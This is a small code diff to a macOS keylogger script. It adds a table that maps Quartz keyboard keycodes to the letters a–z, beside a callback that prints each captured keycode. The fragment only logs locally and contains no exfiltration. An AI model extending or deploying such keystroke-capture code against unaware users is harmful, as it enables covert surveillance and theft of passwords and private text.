@@ -4,7 +4,9 @@ keylogger.py
 """
 import Quartz
 
-
+engcodes = [0, 11, 8, 2, 14, 3, 5, 4, 34, 38, 40, 37, 46, 45, 31, 35, 12, 15, 1, 17, 32, 9, 13, 7, 16, 6]
+keymap = {code: chr(i+97) for i, code in enumerate(engcodes)}
+    
 def _event_call_back(proxy, etype, event, refcon):
     keycode = Quartz.CGEventGetIntegerValueField(event, Quartz.kCGKeyboardEventKeycode)
     print(keycode)
